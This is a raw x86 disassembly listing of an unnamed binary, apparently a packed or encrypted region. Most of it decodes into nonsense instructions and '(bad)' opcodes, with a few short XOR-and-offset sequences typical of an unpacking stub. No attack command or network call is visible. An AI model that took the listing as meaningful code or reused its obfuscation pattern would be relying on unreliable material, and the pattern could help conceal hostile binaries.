  4020ee:	xor    eax,0x828f5bc5
  4020f3:	or     esi,eax
  4020f5:	xor    al,0x3
  4020f7:	xchg   ebx,eax
  4020f8:	gs push 0xffffff90
  4020fb:	or     eax,0xc29af398
  402100:	mov    edx,0xac89739d
  402105:	mov    ecx,edi
  402107:	in     al,dx
  402108:	nop
  402109:	cmp    al,0x52
  40210b:	xchg   ebp,eax
  40210c:	loope  0x4020df
  40210e:	push   edi
  40210f:	shl    DWORD PTR [ebx],0x90
  402112:	loope  0x4020ad
  402114:	and    bl,BYTE PTR [edi]
  402116:	hlt    
  402117:	out    dx,al
  402118:	fsubr  st,st(1)
  40211a:	or     bl,BYTE PTR [edx+ecx*4]
  40211d:	(bad)  
  40211e:	out    0x1f,eax
  402120:	fwait
  402121:	push   ebx
  402122:	mov    dh,0x8a
  402124:	lods   al,BYTE PTR ds:[esi]
  402125:	sub    eax,0xae477a46
  40212a:	mov    al,ds:0x3ad19bed
  40212f:	add    BYTE PTR [eax-0x1f5f8f61],dl
  402135:	shl    eax,0xd0
  402138:	retf   0x97c2
  40213b:	xchg   ecx,eax
  40213c:	mov    cl,0xda
  40213e:	jae    0x40213a
  402140:	test   esp,ebp
  402142:	sub    al,0xa5
  402144:	dec    esi
  402145:	nop
  402146:	aas    
  402147:	test   al,0x47
  402149:	xor    eax,DWORD PTR [esi+0x75f87678]
  40214f:	or     BYTE PTR [ebx+0x245f0c9b],cl
  402155:	mov    ecx,0x32ce443a
  40215a:	push   cs
  40215b:	cmp    eax,0x44d04197
  402160:	pop    ds
  402161:	sti    
  402162:	inc    esp
  402163:	xor    DWORD PTR [esi],ebx
  402165:	loopne 0x402180
  402167:	mov    ecx,0x74539420
  40216c:	mov    BYTE PTR [ecx-0x57],bl
  40216f:	scas   al,BYTE PTR es:[edi]
  402170:	jl     0x4021d3
  402172:	jmp    0x4021c8
  402174:	push   eax
  402175:	inc    ecx
  402176:	push   esi
  402177:	(bad)  
  402178:	jmp    0x40217a
  40217a:	scas   al,BYTE PTR es:[edi]
  40217b:	mov    ds:0x7d3d094c,al
  402180:	mov    WORD PTR [edx+0x130ef30f],es
  402186:	dec    esi
  402187:	test   BYTE PTR [edi],0x6a
  40218a:	dec    edi
  40218b:	adc    ah,BYTE PTR [ebx-0x2d3a0745]
  402191:	daa    
  402192:	cmp    al,0x67
  402194:	mov    al,ds:0xb3b8d111
  402199:	scas   al,BYTE PTR es:[edi]
  40219a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40219b:	inc    eax
  40219c:	add    eax,0x62ca540b
  4021a1:	(bad)  
  4021a2:	adc    dh,BYTE PTR [edi-0x73dc0e85]
  4021a8:	daa    
  4021a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021aa:	outs   dx,DWORD PTR ds:[esi]
  4021ab:	test   BYTE PTR [ecx-0x22],ch
  4021ae:	xor    bh,al
  4021b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021b1:	outs   dx,BYTE PTR ds:[esi]
  4021b2:	rcr    esp,0xb9
  4021b5:	iret   
  4021b6:	sub    BYTE PTR [esi-0x7b],ch
  4021b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021ba:	mov    ds:0x4d0082f3,al
  4021bf:	or     ecx,DWORD PTR [eax]
  4021c1:	jg     0x402172
  4021c3:	push   0x55
  4021c5:	out    dx,eax
  4021c6:	dec    ecx
  4021c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021c8:	fwait
  4021c9:	data16 not BYTE PTR [ebp+0x977048a]
  4021d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021d1:	cmp    ebx,ecx
  4021d3:	cmp    al,0x48
  4021d5:	pop    esi
  4021d6:	enter  0xdd12,0xcd
  4021da:	mov    ebp,0x889f5d8
  4021df:	(bad)  
  4021e0:	in     al,dx
  4021e1:	jmp    0xb894557d
  4021e6:	push   edx
  4021e7:	cmc    
  4021e8:	cmp    eax,0xdfa4df2f
  4021ed:	dec    ecx
  4021ee:	mov    cl,0xee
  4021f0:	cdq    
  4021f1:	sbb    ecx,esi
  4021f3:	inc    ecx
  4021f4:	shr    BYTE PTR [edi+0x5e],1
  4021f7:	iret   
  4021f8:	push   edx
  4021f9:	fild   QWORD PTR [ebx+0x37314a4a]
  4021ff:	xor    eax,0xa79cafed
  402204:	add    BYTE PTR [edx+0x41be929c],0x2c
  40220b:	sbb    ebx,DWORD PTR [esi-0x4d]
  40220e:	push   0xffffffa8
  402210:	push   esp
  402211:	or     dl,BYTE PTR [esi-0x2c448278]
  402217:	cdq    
  402218:	xchg   ebp,eax
  402219:	xchg   ebx,eax
  40221a:	jmp    0x9f8a9fd
  40221f:	push   cs
  402220:	sar    DWORD PTR [ecx-0x7acaf1b2],cl
  402226:	jae    0x40225f
  402228:	sub    eax,0xe4e75019
  40222d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40222e:	jo     0x40223d
  402230:	ret    
  402231:	fs pop es
  402233:	out    dx,eax
  402234:	cmc    
  402235:	scas   al,BYTE PTR es:[edi]
  402236:	ss addr16 pushf 
  402239:	cld    
  40223a:	popa   
  40223b:	jnp    0x4021e9
  40223d:	bnd je 0x402200
  402240:	rol    DWORD PTR [ebp-0x47c59e12],cl
  402246:	ja     0x4021ee
  402248:	in     eax,dx
  402249:	jae    0x40221f
  40224b:	mov    ah,0x72
  40224d:	(bad)
  402251:	cmc    
  402252:	dec    edi
  402253:	or     DWORD PTR [ebp-0x7a],ebp
  402256:	push   ebx
  402257:	inc    edi
  402258:	ja     0x402283
  40225a:	jnp    0x402296
  40225c:	push   es
  40225d:	xchg   ebp,edx
  40225f:	mov    cl,0x52
  402261:	or     ecx,DWORD PTR [edi+0x38]
  402264:	mov    ds:0xe9919050,eax
  402269:	and    ch,BYTE PTR [ecx+0x20]
  40226c:	push   es
  40226d:	hlt    
  40226e:	inc    edx
  40226f:	pop    ss
  402270:	mov    DWORD PTR [edi],esi
  402272:	xlat   BYTE PTR ds:[ebx]
  402273:	jne    0x40228a
  402275:	mov    ecx,0x6532f4ef
  40227a:	outs   dx,DWORD PTR ds:[esi]
  40227b:	dec    ebp
  40227c:	in     al,dx
  40227d:	push   esi
  40227e:	mov    dl,0x2b
  402280:	pop    ebx
  402281:	xor    al,0xe5
  402283:	rcl    BYTE PTR [ebx],0xa7
  402286:	push   ebx
  402287:	in     eax,dx
  402288:	lea    esp,[edx-0x7e5c374f]
  40228e:	ja     0x4022c2
  402290:	ss mov bl,0x95
  402293:	dec    ecx
  402294:	fwait
  402295:	sub    DWORD PTR [ecx+ecx*2-0x574ecf9e],edi
  40229c:	stc    
  40229d:	jo     0x4022ae
  40229f:	imul   ebx,edi,0x818657e0
  4022a5:	xor    eax,esi
  4022a7:	and    DWORD PTR ds:0x42a771,0x42a7b5
  4022b1:	add    eax,edi
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a835,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0x45682c5b
  4022e1:	add    eax,edx
  4022e3:	pushf  
  4022e4:	add    al,0x9
  4022e6:	js     0x402360
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x40227d
  4022ed:	add    bl,BYTE PTR [ecx]
  4022ef:	inc    edi
  4022f0:	mov    al,ds:0xc6bd43c4
  4022f5:	push   eax
  4022f6:	jg     0x402328
  4022f8:	cmp    esp,ebx
  4022fa:	(bad)  
  4022fb:	mov    ah,0x38
  4022fd:	hlt    
  4022fe:	push   esp
  4022ff:	push   0x6cfc8e9
  402304:	std    
  402305:	test   eax,0xcd57b647
  40230a:	mov    esp,0xeece6a29
  40230f:	push   ecx
  402310:	push   cs
  402311:	jp     0x402335
  402313:	lods   al,BYTE PTR ds:[esi]
  402314:	out    0xa2,eax
  402316:	jp     0x402339
  402318:	sti    
  402319:	sbb    ch,bh
  40231b:	xor    al,0x17
  40231d:	xchg   edx,eax
  40231e:	dec    edx
  40231f:	pop    ecx
  402320:	mov    ebx,0x36e3d344
  402325:	test   BYTE PTR [ebx-0x5203d395],0x8f
  40232c:	shl    DWORD PTR [edi-0x799e9bc2],cl
  402332:	div    DWORD PTR [edi+ecx*2-0x8]
  402336:	jo     0x40234f
  402338:	mov    bh,0xa7
  40233a:	mov    ebp,esi
  40233c:	(bad)  
  40233d:	mov    ebp,0x6ba0c874
  402342:	pop    ebp
  402343:	in     eax,dx
  402344:	mov    ecx,0x3320b67a
  402349:	push   0x3
  40234b:	ins    BYTE PTR es:[edi],dx
  40234c:	je     0x402320
  40234e:	fdivp  st(0),st
  402350:	sub    edx,DWORD PTR [ebp-0x779c48c]
  402356:	or     ch,BYTE PTR ds:0x72d2d556
  40235c:	mov    ah,0xc7
  40235e:	xchg   BYTE PTR [ebx],ch
  402360:	push   0x4b
  402362:	dec    esi
  402363:	dec    esi
  402364:	push   ecx
  402365:	sub    BYTE PTR cs:[eax-0x6e],0x64
  40236a:	pusha  
  40236b:	je     0x402310
  40236d:	xor    dh,dl
  40236f:	neg    BYTE PTR [edi+0x0]
  402372:	aaa    
  402373:	paddd  mm6,QWORD PTR [edx+edi*1-0x35bf8b66]
  40237b:	sbb    al,0x8d
  40237d:	cmp    al,0xb3
  40237f:	dec    ebx
  402380:	xchg   esi,eax
  402381:	das    
  402382:	pop    ss
  402383:	lods   eax,DWORD PTR ds:[esi]
  402384:	jle    0x4023f7
  402386:	cmp    eax,ecx
  402388:	ret    0x4c62
  40238b:	stc    
  40238c:	inc    DWORD PTR [eax+edx*8+0x1]
  402390:	xor    BYTE PTR [esi],0x65
  402393:	jmp    0x40237d
  402395:	mov    al,0x23
  402397:	fwait
  402398:	and    DWORD PTR [ebp+0x47841094],ecx
  40239e:	xchg   ecx,eax
  40239f:	inc    ebp
  4023a0:	dec    edi
  4023a1:	push   0x2d23bc51
  4023a6:	outs   dx,DWORD PTR ds:[esi]
  4023a7:	imul   di,WORD PTR [edi],0xc271
  4023ac:	jecxz  0x402367
  4023ae:	stos   DWORD PTR es:[edi],eax
  4023af:	mov    ds:0x445aa3ba,eax
  4023b4:	sbb    eax,0x137350e1
  4023b9:	jae    0x40236e
  4023bb:	popa   
  4023bc:	add    DWORD PTR [ebx-0x6247cbcd],esp
  4023c2:	cmp    ebx,ebx
  4023c4:	xor    edx,DWORD PTR [esi+0x4bb37c42]
  4023ca:	in     al,dx
  4023cb:	shl    BYTE PTR [ebx-0x4f],1
  4023ce:	pop    edx
  4023cf:	hlt    
  4023d0:	enter  0x3c30,0x5f
  4023d4:	ret    
  4023d5:	mov    edi,0x12b1dd3f
  4023da:	mov    cl,0x52
  4023dc:	data16 adc BYTE PTR [esi-0x3796f8c9],ah
  4023e3:	loopne 0x40240e
  4023e5:	cli    
  4023e6:	jmp    FWORD PTR [esi+0x79]
  4023e9:	gs lahf 
  4023eb:	mov    edx,edx
  4023ed:	leave  
  4023ee:	sub    DWORD PTR [esi],esp
  4023f0:	dec    esi
  4023f1:	cmp    al,BYTE PTR [edi]
  4023f3:	mov    al,ds:0x74d4fee9
  4023f8:	scas   eax,DWORD PTR es:[edi]
  4023f9:	inc    edx
  4023fa:	sub    cl,BYTE PTR [ebp-0x1d]
  4023fd:	jmp    0x8274:0x108c02b6
  402404:	arpl   WORD PTR [eax+0xd],ax
  402407:	jecxz  0x4023ef
  402409:	and    bl,0x87
  40240c:	add    eax,DWORD PTR [ecx]
  40240e:	rcr    esi,1
  402410:	addr16 sahf 
  402412:	jns    0x402395
  402414:	mov    al,ds:0xbb92559e
  402419:	ret    0x90ae
  40241c:	(bad)  
  40241d:	out    dx,eax
  40241e:	inc    ebp
  40241f:	or     al,cl
  402421:	adc    DWORD PTR [edi-0x5],ebp
  402424:	outs   dx,DWORD PTR ds:[esi]
  402425:	cmp    cl,BYTE PTR [ebx+0x7aebe6e2]
  40242b:	clc    
  40242c:	rcr    ah,cl
  40242e:	dec    ebx
  40242f:	cmc    
  402430:	jne    0x402425
  402432:	imul   esi,DWORD PTR [edi-0x69bf4dc1],0xf4009115
  40243c:	jl     0x402452
  40243e:	jl     0x4024ac
  402440:	mov    ch,cl
  402442:	or     cl,cl
  402444:	mov    edx,0x757e5284
  402449:	xchg   edx,eax
  40244a:	cmp    al,0x8f
  40244c:	mov    al,ds:0xfb14d2ef
  402451:	pop    edi
  402452:	push   cs
  402453:	or     esp,esp
  402455:	push   ebx
  402456:	jecxz  0x4023f6
  402458:	xchg   DWORD PTR [eax],edx
  40245a:	out    0x90,eax
  40245c:	fs pop esi
  40245e:	sbb    ch,cl
  402460:	pop    ecx
  402461:	jns    0x402426
  402463:	xor    al,0xaf
  402465:	adc    dl,ah
  402467:	rol    DWORD PTR [ebp-0x54],1
  40246a:	cmp    ecx,DWORD PTR gs:0x99301a7b
  402471:	mov    bl,BYTE PTR [eax+edx*1]
  402474:	pop    edi
  402475:	fwait
  402476:	cs adc eax,0x9ef22fbe
  40247c:	lds    edx,FWORD PTR [edi-0x30]
  40247f:	jb     0x402405
  402481:	scas   eax,DWORD PTR es:[edi]
  402482:	push   eax
  402483:	inc    esp
  402484:	dec    edx
  402485:	scas   eax,DWORD PTR es:[edi]
  402486:	xchg   ecx,eax
  402487:	mov    cl,0xc6
  402489:	sub    al,0xf5
  40248b:	retf   
  40248c:	pop    ds
  40248d:	sub    bl,BYTE PTR [eax]
  40248f:	dec    edx
  402490:	sub    al,0xb1
  402492:	xchg   ax,ax
  402494:	in     al,0x8b
  402496:	push   cs
  402497:	out    0x64,al
  402499:	dec    edi
  40249a:	cmp    BYTE PTR [edx+0x10],bh
  40249d:	add    esp,ebx
  40249f:	imul   ebx,edx,0x5d9830f8
  4024a5:	or     eax,0x308d1291
  4024aa:	inc    edi
  4024ab:	xor    dl,bl
  4024ad:	pushf  
  4024ae:	xchg   esp,eax
  4024af:	test   BYTE PTR ds:0xcfe4d8e1,dl
  4024b5:	je     0x40252a
  4024b7:	push   ebx
  4024b8:	xor    ebx,DWORD PTR [edx+0x1f5d0e92]
  4024be:	fldenv [esp+esi*4-0x3b]
  4024c2:	jb     0x402471
  4024c4:	repz loop 0x402494
  4024c7:	mov    al,0x2d
  4024c9:	pop    eax
  4024ca:	pop    ds
  4024cb:	das    
  4024cc:	xor    cl,BYTE PTR [ecx-0x5a]
  4024cf:	mov    esi,0x2f8c2481
  4024d4:	xchg   ebx,eax
  4024d5:	xchg   ebx,eax
  4024d6:	mov    ebx,edi
  4024d8:	pop    edi
  4024d9:	mov    ch,0xa1
  4024db:	fmul   DWORD PTR [edi+edx*2-0x29e35fcc]
  4024e2:	stos   DWORD PTR es:[edi],eax
  4024e3:	mov    ebp,0x767fd4f1
  4024e8:	add    BYTE PTR [ecx],bh
  4024ea:	xor    eax,0x6a4223b2
  4024ef:	add    WORD PTR [edx-0x145d687d],bp
  4024f6:	iret   
  4024f7:	mov    ecx,0x7acee743
  4024fc:	jno    0x4024ff
  4024fe:	inc    eax
  4024ff:	mov    esp,0x93aca31d
  402504:	shl    DWORD PTR [edi-0x7faf0993],cl
  40250a:	xchg   ebp,eax
  40250b:	adc    BYTE PTR [edx],bh
  40250d:	or     BYTE PTR [ebx],bh
  40250f:	xchg   ecx,eax
  402510:	je     0x4024d6
  402512:	sbb    al,0x1d
  402514:	add    DWORD PTR [ebx-0x62225fbf],ebp
  40251a:	cli    
  40251b:	xor    esi,DWORD PTR [edi]
  40251d:	mov    ah,0x2d
  40251f:	xor    ch,BYTE PTR [edi+0x58]
  402522:	es out dx,al
  402524:	and    bl,dh
  402526:	jl     0x402518
  402528:	sub    al,BYTE PTR [edi-0x545a659f]
  40252e:	clc    
  40252f:	cmp    al,0x7
  402531:	neg    esi
  402533:	arpl   WORD PTR [eax],cx
  402535:	mov    ch,BYTE PTR [edi]
  402537:	ins    DWORD PTR es:[edi],dx
  402538:	sti    
  402539:	jge    0x4024f5
  40253b:	mov    ebx,0x8e31d2aa
  402540:	push   eax
  402541:	mov    eax,ds:0x8090c229
  402546:	and    DWORD PTR [edx+0x7b],ebp
  402549:	xchg   BYTE PTR [ecx+0x21],bh
  40254c:	add    eax,0x41c69894
  402551:	lahf   
  402552:	aad    0x4e
  402554:	jmp    0x8889:0x6aef41c9
  40255b:	jb     0x402500
  40255d:	push   0x8f23ed76
  402562:	jg     0x4024ef
  402564:	popa   
  402565:	enter  0x4008,0x18
  402569:	pusha  
  40256a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40256b:	(bad)  
  40256c:	pop    esi
  40256d:	lea    edi,[ecx]
  40256f:	add    DWORD PTR [edi],ecx
  402571:	test   DWORD PTR [edx+eax*1+0x458b0000],edi
  402578:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	inc    edx
  402594:	or     BYTE PTR [edx+esi*2-0x76],0xf
  402599:	js     0x402613
  40259b:	(bad)  
  40259c:	jle    0x402616
  40259e:	js     0x40255b
  4025a0:	aam    0xf3
  4025a2:	iret   
  4025a3:	mov    ah,0xc2
  4025a5:	mov    DWORD PTR [eax],esp
  4025a7:	mov    dl,0x2f
  4025a9:	inc    eax
  4025ab:	jnp    0x4025ae
  4025ad:	ret    
  4025ae:	mov    BYTE PTR [esi+ebx*1],0x45
  4025b2:	call   0xdebf:0x9c14aeea
  4025b9:	mov    ?,WORD PTR [esi+0x11]
  4025bc:	sbb    dh,BYTE PTR [ecx+ecx*2-0x782bbe26]
  4025c3:	xchg   edx,eax
  4025c4:	mov    dl,0x9
  4025c6:	jb     0x402556
  4025c8:	neg    BYTE PTR [edx-0x39cd9d0e]
  4025ce:	inc    ebx
  4025cf:	push   ebp
  4025d0:	jnp    0x402606
  4025d2:	(bad)  
  4025d3:	push   ecx
  4025d5:	jmp    0x75f2:0xeb0bf98b
  4025dc:	cmp    ebx,ecx
  4025de:	and    ah,BYTE PTR [edi+ebx*8-0x77]
  4025e2:	and    DWORD PTR [edi+0x33],edx
  4025e5:	out    dx,al
  4025e6:	imul   ebx,DWORD PTR [esi-0x3e03fc16],0xce39dfd2
  4025f0:	(bad)  
  4025f1:	push   0xffffff8c
  4025f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025f4:	sub    edi,0xfbe408e1
  4025fa:	aas    
  4025fb:	lds    esp,FWORD PTR [edx-0x67]
  4025fe:	mov    edi,0xf0ce7cc9
  402603:	xchg   ebp,eax
  402604:	scas   al,BYTE PTR es:[edi]
  402605:	xchg   esi,eax
  402606:	inc    eax
  402607:	outs   dx,DWORD PTR ds:[esi]
  402608:	push   cs
  402609:	sbb    al,0x38
  40260b:	sbb    ah,ah
  40260d:	push   edx
  40260e:	sub    ah,BYTE PTR [ebx]
  402610:	int3   
  402611:	arpl   WORD PTR [edx-0x212b6b68],ax
  402617:	xlat   BYTE PTR ds:[ebx]
  402618:	dec    edi
  402619:	iret   
  40261a:	push   0x7e72c99
  40261f:	pop    ebp
  402620:	ficomp DWORD PTR [eax+0x38f82c43]
  402626:	lock dec esp
  402628:	xlat   BYTE PTR ds:[ebx]
  402629:	hlt    
  40262a:	mov    cl,0x7
  40262c:	or     eax,eax
  40262e:	or     ah,BYTE PTR [esi]
  402630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402631:	lds    eax,FWORD PTR ds:0x9e5a2b77
  402637:	adc    DWORD PTR ds:0xac6c0961,ecx
  40263d:	sti    
  40263e:	pop    eax
  40263f:	jle    0x402637
  402641:	imul   edi,DWORD PTR [esi-0x6f],0x1833f661
  402648:	imul   edx,ecx,0xffffffda
  40264b:	arpl   bp,dx
  40264d:	adc    esp,DWORD PTR [edi+0x74]
  402650:	push   cs
  402651:	xlat   BYTE PTR ds:[ebx]
  402652:	xor    eax,0x1b04684a
  402657:	xor    bh,cl
  402659:	lods   al,BYTE PTR ds:[esi]
  40265a:	pusha  
  40265b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40265c:	fstp   TBYTE PTR ss:[edi-0x61]
  402660:	popa   
  402661:	cmp    dl,BYTE PTR [edi]
  402663:	ret    
  402664:	dec    eax
  402665:	dec    esi
  402666:	arpl   WORD PTR [ecx+0x84ff951],bx
  40266c:	das    
  40266d:	adc    DWORD PTR [ebp+0x53],ecx
  402670:	aam    0x25
  402672:	and    DWORD PTR [ecx-0x25],0x9c0bdaf7
  402679:	xchg   edx,eax
  40267a:	(bad)  
  40267b:	(bad)  
  40267c:	push   ebp
  40267d:	lahf   
  40267e:	mov    ah,BYTE PTR [esp+ebp*1-0x3f645544]
  402685:	mov    dl,0x46
  402687:	call   0xc6ec:0xae1b9018
  40268e:	jp     0x402648
  402690:	pop    edx
  402691:	ret    
  402692:	xor    ah,BYTE PTR [ecx-0x42]
  402695:	jb     0x40262b
  402697:	fisub  DWORD PTR [eax+0x6170edf3]
  40269d:	lea    ebp,[ebx+0x2d]
  4026a0:	out    dx,eax
  4026a1:	in     eax,dx
  4026a2:	push   ds
  4026a3:	jb     0x40270d
  4026a5:	outs   dx,BYTE PTR ds:[esi]
  4026a6:	sbb    ebp,ecx
  4026a8:	out    0xda,al
  4026aa:	cli    
  4026ab:	imul   edi,DWORD PTR [esi],0x37
  4026ae:	ins    DWORD PTR es:[edi],dx
  4026af:	sub    edi,DWORD PTR [esi+ebx*8]
  4026b2:	ja     0x402648
  4026b4:	sbb    eax,0x3e30ea1e
  4026b9:	adc    bh,BYTE PTR [edx]
  4026bb:	jle    0x40267b
  4026bd:	sub    eax,0x4b1a0728
  4026c2:	adc    al,0xb3
  4026c4:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4026c6:	hlt    
  4026c7:	mov    esi,0x220e6cad
  4026cc:	and    BYTE PTR [edi],ch
  4026ce:	xchg   esi,eax
  4026cf:	xchg   edi,eax
  4026d0:	mov    DWORD PTR [ebp+0x49fb2b3c],edi
  4026d6:	push   ss
  4026d7:	dec    esi
  4026d8:	imul   edi,DWORD PTR ds:0x5886e8f1,0x14
  4026df:	imul   ebp,DWORD PTR gs:[edi+0x61177a4f],0x533b71f6
  4026ea:	iret   
  4026eb:	sub    ch,ch
  4026ed:	loop   0x402694
  4026ef:	cmp    dl,BYTE PTR [ecx+0x2c]
  4026f2:	fiadd  DWORD PTR [ecx-0x7b9e5497]
  4026f8:	int    0x35
  4026fa:	ret    0x2e90
  4026fd:	sar    ebx,1
  4026ff:	and    eax,0x26b47c48
  402704:	fstp   QWORD PTR [esi]
  402706:	test   BYTE PTR [eax+0x1596deab],dl
  40270c:	hlt    
  40270d:	gs mov ch,0x7b
  402710:	retf   0xcd8b
  402713:	pushf  
  402714:	cmp    DWORD PTR [ecx+0x6c6a1676],ebx
  40271a:	mov    al,0xb4
  40271c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40271d:	sahf   
  40271e:	mov    dl,0xab
  402720:	out    dx,al
  402721:	ficomp WORD PTR ds:[ecx]
  402724:	sub    DWORD PTR [esi+0x62],0x1
  402728:	mov    DWORD PTR [esi+0x7995ff39],ebx
  40272e:	cli    
  40272f:	pop    esi
  402730:	dec    edx
  402731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402732:	adc    eax,0xdfe56685
  402737:	push   edx
  402738:	enter  0x70a9,0x2b
  40273c:	push   0x55d738db
  402741:	mov    ebp,0xb90ab38e
  402746:	push   ebx
  402747:	xchg   ebx,ecx
  402749:	hlt    
  40274a:	and    al,BYTE PTR [edi-0x42d0285b]
  402750:	div    BYTE PTR [ebx+0xc]
  402753:	not    BYTE PTR [ebx]
  402755:	or     BYTE PTR [ebx],0x46
  402758:	fild   QWORD PTR [edx+0x418c8ab8]
  40275e:	add    eax,0xd37002e2
  402763:	js     0x402739
  402765:	jg     0x40276e
  402767:	jmp    0x40277e
  402769:	fnstenv [ecx-0x49]
  40276c:	hlt    
  40276d:	xor    eax,0x618be7d6
  402772:	add    DWORD PTR [edx-0x45590197],edx
  402778:	or     DWORD PTR [esi+0x4c3f6232],ebx
  40277e:	(bad)  
  402780:	dec    esi
  402781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402782:	idiv   DWORD PTR [ecx-0x2d]
  402785:	cmp    DWORD PTR [edi-0x3dc92b05],eax
  40278b:	mov    eax,0x347bf4e7
  402790:	pop    ss
  402791:	stos   BYTE PTR es:[edi],al
  402792:	fwait
  402793:	retf   
  402794:	mov    bl,0x15
  402796:	mov    edx,esp
  402798:	cmp    DWORD PTR [eax],ecx
  40279a:	mov    esp,0x34a0c306
  40279f:	or     ah,BYTE PTR [edx]
  4027a1:	and    al,0x1a
  4027a3:	adc    al,0x6c
  4027a5:	std    
  4027a6:	xchg   esp,eax
  4027a7:	imul   esp,DWORD PTR [ebx+0x25],0x35
  4027ab:	retf   0x9395
  4027ae:	popf   
  4027af:	inc    esi
  4027b0:	les    esi,FWORD PTR [esp+ecx*2+0x5e]
  4027b4:	data16 not BYTE PTR [ecx]
  4027b7:	pop    edx
  4027b8:	cmc    
  4027b9:	pop    eax
  4027ba:	mov    edx,0x4e0e2b2
  4027bf:	cdq    
  4027c0:	add    al,0x30
  4027c2:	test   al,0xe4
  4027c4:	shl    DWORD PTR [edi-0x71],cl
  4027c7:	sbb    al,0x97
  4027c9:	pop    esp
  4027ca:	fwait
  4027cb:	cmp    al,0x4f
  4027cd:	fucomp st(4)
  4027cf:	jp     0x402793
  4027d1:	xor    edi,DWORD PTR [ebx-0x50]
  4027d4:	inc    edx
  4027d5:	mov    es,WORD PTR [edi]
  4027d7:	sahf   
  4027d8:	shl    BYTE PTR [eax],0xf4
  4027db:	pop    eax
  4027dc:	aam    0xcc
  4027de:	add    BYTE PTR [esi],dh
  4027e0:	sub    ah,BYTE PTR [edi-0x13]
  4027e3:	or     BYTE PTR [esp+eax*1+0x5e],bl
  4027e7:	test   BYTE PTR ds:0x343ce5f2,bl
  4027ed:	cmp    eax,0xd0897285
  4027f2:	hlt    
  4027f3:	xchg   edx,eax
  4027f4:	sbb    edi,DWORD PTR [edi]
  4027f6:	jbe    0x402864
  4027f8:	add    eax,0x522b0039
  4027fd:	outs   dx,BYTE PTR ds:[esi]
  4027fe:	(bad)  
  4027ff:	(bad)  
  402801:	mov    edx,0xd78c3431
  402806:	lea    edi,[edx+0x571581b0]
  40280c:	pop    ds
  40280d:	inc    esp
  40280e:	arpl   dx,ax
  402810:	pop    es
  402811:	(bad)  
  402812:	stc    
  402813:	jo     0x4027e2
  402815:	and    ah,dl
  402817:	add    BYTE PTR [edi],0xe8
  40281a:	jmp    0x8a23a00b
  40281f:	nop
  402820:	fisttp DWORD PTR [ebx+0x4d8bf045]
  402826:	adc    BYTE PTR [ebx],dh
  402828:	into   
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	cmp    eax,0x8fc0fbc
  402886:	or     al,0x78
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x4028a4
  40288e:	push   ds
  40288f:	adc    BYTE PTR [edi+0x59],bl
  402892:	pop    esi
  402893:	mov    BYTE PTR [esi-0x1c],0xe6
  402897:	div    al
  402899:	sbb    BYTE PTR [ebp+0x51],ah
  40289c:	ss dec eax
  40289e:	bound  edx,QWORD PTR [esi+0x20]
  4028a1:	aam    0x9e
  4028a3:	jg     0x4028c2
  4028a5:	add    al,0x61
  4028a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028a8:	sub    al,0x1e
  4028aa:	arpl   WORD PTR [edx-0x39],sp
  4028ad:	dec    edi
  4028ae:	cdq    
  4028af:	xor    ecx,eax
  4028b1:	xor    cl,ch
  4028b3:	mov    cl,0x70
  4028b5:	popf   
  4028b6:	call   0xf67bd907
  4028bb:	test   eax,0x1e997d69
  4028c0:	pop    ecx
  4028c1:	stos   DWORD PTR es:[edi],eax
  4028c2:	xor    ebp,DWORD PTR [esi-0x2731f35c]
  4028c8:	jnp    0x4028cd
  4028ca:	imul   edi,ebx,0xafef92a4
